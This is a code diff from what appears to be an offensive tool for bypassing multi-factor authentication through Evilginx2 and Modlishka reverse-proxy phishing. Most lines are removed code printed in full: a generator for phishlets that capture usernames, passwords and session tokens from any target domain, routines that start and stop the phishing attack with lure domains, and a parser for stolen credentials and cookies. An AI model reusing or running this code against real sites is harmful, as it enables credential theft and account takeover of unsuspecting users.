@@ -60,59 +60,12 @@ class MFABypass:
         """List available phishlets (login page templates)."""
         phishlets = []
         if os.path.exists(self.phishlets_dir):
-            for f in os.listdir(self.phishlets_dir):
-                if f.endswith(".yaml"):
-                    phishlets.append(f.replace(".yaml", ""))
+            phishlets.extend(
+                f.replace(".yaml", "")
+                for f in os.listdir(self.phishlets_dir)
+                if f.endswith(".yaml")
+            )
         return phishlets
-
-    def create_phishlet(
-        self,
-        name: str,
-        target_domain: str,
-        login_path: str = "/login",
-    ) -> str:
-        """Generate a custom phishlet for a target."""
-        phishlet_content = f"""
-name: '{name}'
-author: 'Drakben'
-min_ver: '2.4.0'
-
-proxy_hosts:
-  - phish_subdomain: ''
-    orig_subdomain: ''
-    domain: '{target_domain}'
-    session: true
-    is_landing: true
-
-credentials:
-  username:
-    key: 'email'
-    search: '(.*)'
-    type: 'post'
-  password:
-    key: 'password'
-    search: '(.*)'
-    type: 'post'
-
-auth_tokens:
-  - domain: '.{target_domain}'
-    keys: ['session', 'auth_token', 'access_token']
-
-login:
-  domain: '{target_domain}'
-  path: '{login_path}'
-"""
-        phishlet_path = os.path.join(self.phishlets_dir, f"{name}.yaml")
-
-        try:
-            os.makedirs(self.phishlets_dir, exist_ok=True)
-            with open(phishlet_path, "w", encoding="utf-8") as f:
-                f.write(phishlet_content)
-            logger.info("Phishlet created: %s", phishlet_path)
-            return phishlet_path
-        except Exception as e:
-            logger.exception("Failed to create phishlet: %s", e)
-            return ""
 
     def start_proxy(self, _phishlet: str, _lure_domain: str) -> bool:
         """Start Evilginx2 in background mode."""
@@ -141,13 +94,6 @@ login:
         except Exception as e:
             logger.exception("Failed to start Evilginx2: %s", e)
             return False
-
-    def stop_proxy(self) -> None:
-        """Stop Evilginx2 process."""
-        if self.process:
-            self.process.terminate()
-            self.process = None
-            logger.info("Evilginx2 proxy stopped")
 
     def parse_captured_sessions(
         self,
@@ -551,75 +497,3 @@ class UnifiedMFABypass:
         logger.info(f"Switched to backend: {backend.value}")
         return True
 
-    async def start_attack(self, target_url: str, **kwargs: Any) -> bool:
-        """Start MFA bypass attack using active backend."""
-        if self.active_backend == ProxyBackend.BUILTIN:
-            return await self.builtin.start(target_url)
-        elif self.active_backend == ProxyBackend.MODLISHKA:
-            config = self.modlishka.create_config(
-                target_domain=target_url.replace("https://", "").replace("http://", ""),
-                phishing_domain=kwargs.get("phishing_domain", "phish.local"),
-            )
-            return self.modlishka.start(config)
-        else:
-            # Evilginx requires more setup
-            return self.evilginx.start_proxy(
-                kwargs.get("phishlet", "default"),
-                kwargs.get("lure_domain", "phish.local"),
-            )
-
-    async def stop_attack(self) -> None:
-        """Stop active attack."""
-        if self.active_backend == ProxyBackend.BUILTIN:
-            await self.builtin.stop()
-        elif self.active_backend == ProxyBackend.MODLISHKA:
-            self.modlishka.stop()
-        else:
-            self.evilginx.stop_proxy()
-
-    def get_captured(self) -> list[Any]:
-        """Get captured credentials/sessions."""
-        if self.active_backend == ProxyBackend.BUILTIN:
-            return self.builtin.get_captured_credentials()
-        elif self.active_backend == ProxyBackend.MODLISHKA:
-            return self._parse_modlishka_logs()
-        else:
-            return self.evilginx.parse_captured_sessions()
-
-    def _parse_modlishka_logs(self) -> list[CapturedCredential]:
-        """Parse Modlishka captured credentials from log files.
-
-        Modlishka stores captured data in JSON format in its data directory.
-        Returns list of CapturedCredential objects.
-        """
-        from datetime import datetime
-
-        credentials: list[CapturedCredential] = []
-        log_path = os.path.join(self.modlishka.modlishka_path, "data", "captured.json")
-
-        if not os.path.exists(log_path):
-            logger.debug("Modlishka log file not found: %s", log_path)
-            return credentials
-
-        try:
-            with open(log_path, encoding="utf-8") as f:
-                data = json.load(f)
-
-            for entry in data.get("credentials", []):
-                cred = CapturedCredential(
-                    username=entry.get("username", ""),
-                    password=entry.get("password", ""),
-                    cookies=entry.get("cookies", {}),
-                    headers=entry.get("headers", {}),
-                    timestamp=entry.get("timestamp", datetime.now().isoformat()),
-                )
-                credentials.append(cred)
-
-            logger.info("Parsed %d credentials from Modlishka logs", len(credentials))
-
-        except json.JSONDecodeError as e:
-            logger.error("Invalid JSON in Modlishka log: %s", e)
-        except Exception as e:
-            logger.exception("Failed to parse Modlishka logs: %s", e)
-
-        return credentials
